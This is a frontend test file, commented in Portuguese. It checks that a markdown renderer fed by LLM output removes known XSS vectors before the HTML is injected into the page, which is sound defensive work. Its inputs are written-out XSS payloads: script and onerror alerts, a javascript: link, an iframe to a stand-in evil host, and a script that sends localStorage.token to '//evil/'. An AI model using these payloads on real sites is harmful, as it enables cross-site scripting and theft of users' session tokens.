// frontend/tests/markdown-sanitize.test.mjs
//
// O HTML renderizado vai direto para `dangerouslySetInnerHTML`, e a fonte é o
// LLM (que pode reproduzir HTML de páginas que leu via web_search). Estes
// testes garantem que os vetores conhecidos ficam neutralizados.
//
// Roda com jsdom porque DOMPurify precisa de um DOM real.
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";

const dom = new JSDOM("<!doctype html><html><body></body></html>");

// DOMPurify e marked são ESM/browser-first: instala o DOM antes de importar.
globalThis.window = dom.window;
globalThis.document = dom.window.document;
globalThis.Node = dom.window.Node;
globalThis.HTMLElement = dom.window.HTMLElement;

const { renderMarkdown } = await import("../src/markdown.ts");

function check(label, input, mustNotContain = []) {
  const out = renderMarkdown(input);
  for (const bad of mustNotContain) {
    assert(
      !out.toLowerCase().includes(bad.toLowerCase()),
      `${label}: saída contém ${JSON.stringify(bad)}\n  saída: ${out}`
    );
  }
  return out;
}

// 1. <script> não sobrevive.
check("script tag", "<script>alert(1)</script>", ["<script", "alert(1)"]);

// 2. Handler inline não sobrevive.
check("onerror inline", '<img src=x onerror="alert(1)">', ["onerror"]);

// 3. href javascript: é removido.
check("javascript: link", "[clique](javascript:alert(document.domain))", ["javascript:"]);

// 4. iframe/object/embed não passam.
check("iframe", '<iframe src="https://evil.example.com"></iframe>', ["<iframe"]);

// 5. Evento em elemento legítimo é removido.
check("svg onload", '<svg onload="alert(1)"></svg>', ["onload"]);

// 6. Caso real: markdown com bloco de código contendo HTML.
check(
  "code block com html",
  "```html\n<script>fetch('//evil/'+localStorage.token)</script>\n```",
  ["<script"]
);

// 7. Markdown legítimo continua funcionando.
const normal = renderMarkdown("# Título\n\n**negrito** e *itálico*\n\n- item 1\n- item 2");
assert(normal.includes("<h1"), "heading perdido");
assert(normal.includes("<strong>"), "negrito perdido");
assert(normal.includes("<li>"), "lista perdida");

// 8. Tabela GFM continua funcionando.
const table = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
assert(table.includes("<table"), "tabela perdida");

// 9. Entrada vazia/nula não quebra.
assert.equal(renderMarkdown(""), "");
assert.equal(renderMarkdown(null), "");
assert.equal(renderMarkdown(undefined), "");

// 10. Texto puro passa intacto.
assert(renderMarkdown("apenas texto").includes("apenas texto"));

console.log("✅ Sanitização de Markdown verificada (10 casos).");
